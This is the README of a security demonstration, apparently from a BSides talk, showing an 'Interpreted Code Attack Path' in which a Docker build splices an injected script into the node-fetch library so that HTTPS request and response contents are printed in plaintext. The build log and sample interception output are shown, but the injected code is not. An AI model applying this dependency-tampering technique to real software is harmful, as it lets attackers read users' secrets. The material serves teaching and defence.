# Overview

Demonstrates the Interpreted Code Attack Path.

# Usage

* `make` for the full output.
* `make run_head` for abbreviated output.

# Output

The `Sending: ...` and `Receiving: ...` output PoCs interception of the HTTPS content in the clear.

```
$ make run_head
docker build -t bsides/interpreted-code-attack-path .
[+] Building 0.5s (13/13) FINISHED                                                          docker:default
 => [internal] load .dockerignore                                                                     0.0s
 => => transferring context: 2B                                                                       0.0s
 => [internal] load build definition from Dockerfile                                                  0.0s
 => => transferring dockerfile: 520B                                                                  0.0s
 => [internal] load metadata for docker.io/bsides/nodejs-internal-service:latest                      0.0s
 => [internal] load metadata for docker.io/library/node:lts-buster                                    0.3s
 => [build 1/5] FROM docker.io/library/node:lts-buster@sha256:2daec43046b715994ce9c816b9c91478a0d5fb  0.0s
 => [internal] load build context                                                                     0.0s
 => => transferring context: 31B                                                                      0.0s
 => [stage-1 1/2] FROM docker.io/bsides/nodejs-internal-service                                       0.0s
 => CACHED [build 2/5] WORKDIR /tmp                                                                   0.0s
 => CACHED [build 3/5] RUN npm install node-fetch@3.3.2                                               0.0s
 => CACHED [build 4/5] COPY inject.js .                                                               0.0s
 => CACHED [build 5/5] RUN sed node_modules/node-fetch/src/index.js     -e '/fetch-blob\/from.js/r i  0.0s
 => CACHED [stage-1 2/2] COPY --from=build     /tmp/modified_index.js     node_modules/node-fetch/sr  0.0s
 => exporting to image                                                                                0.0s
 => => exporting layers                                                                               0.0s
 => => writing image sha256:ee2156429019c3e9fa7eee0dfa842492314cac4317d669356be0b8e88b276a54          0.0s
 => => naming to docker.io/bsides/interpreted-code-attack-path                                        0.0s
docker run --rm bsides/interpreted-code-attack-path 2>&1 | head -n 15
Sending: POST / HTTP/1.1
accept: */*
accept-encoding: gzip, deflate, br
content-length: 20
content-type: text/plain;charset=UTF-8
user-agent: node-fetch
Host: example.com
Connection: close


Sending: SUPER SENSITIVE DATA
Sending: 
Receiving: HTTP/1.1 200 OK
Accept-Ranges: bytes
Cache-Control: max-age=604800
```